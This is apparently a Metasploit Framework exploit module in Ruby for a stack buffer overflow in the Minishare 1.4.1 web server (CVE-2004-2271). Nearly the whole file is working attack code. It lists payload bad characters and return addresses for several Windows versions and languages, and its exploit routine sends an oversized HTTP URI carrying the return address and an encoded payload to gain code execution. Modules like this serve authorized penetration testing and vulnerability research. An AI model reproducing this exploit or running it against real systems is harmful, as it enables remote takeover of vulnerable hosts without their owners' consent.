##
# $Id: minishare_get_overflow.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Minishare 1.4.1 Buffer Overflow',
			'Description'    => %q{
					This is a simple buffer overflow for the minishare web
				server. This flaw affects all versions prior to 1.4.2. This
				is a plain stack buffer overflow that requires a "jmp esp" to reach
				the payload, making this difficult to target many platforms
				at once. This module has been successfully tested against
				1.4.1. Version 1.3.4 and below do not seem to be vulnerable.
			},
			'Author'         => [ 'acaro <acaro@jervus.it>' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2004-2271'],
					[ 'OSVDB', '11530'],
					[ 'BID', '11620'],
					[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2004-11/0208.html'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x40",
					'MinNops'  => 64,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows 2000 SP0-SP3 English', { 'Rets' => [ 1787, 0x7754a3ab ]}], # jmp esp
					['Windows 2000 SP4 English',     { 'Rets' => [ 1787, 0x7517f163 ]}], # jmp esp
					['Windows XP SP0-SP1 English',   { 'Rets' => [ 1787, 0x71ab1d54 ]}], # push esp, ret
					['Windows XP SP2 English',       { 'Rets' => [ 1787, 0x71ab9372 ]}], # push esp, ret
					['Windows 2003 SP0 English',     { 'Rets' => [ 1787, 0x71c03c4d ]}], # push esp, ret
					['Windows NT 4.0 SP6',           { 'Rets' => [ 1787, 0x77f329f8 ]}], # jmp esp
					['Windows XP SP2 German',        { 'Rets' => [ 1787, 0x77d5af0a ]}], # jmp esp
					['Windows XP SP2 Polish',        { 'Rets' => [ 1787, 0x77d4e26e ]}], # jmp esp
					['Windows XP SP2 French',        { 'Rets' => [ 1787, 0x77d5af0a ]}], # jmp esp
				],
			'DisclosureDate' => 'Nov 7 2004'))
	end

	def exploit
		uri = rand_text_alphanumeric(target['Rets'][0])
		uri << [target['Rets'][1]].pack('V')
		uri << payload.encoded

		print_status("Trying target address 0x%.8x..." % target['Rets'][1])
		send_request_raw({
			'uri' => uri
		}, 5)

		handler
	end

end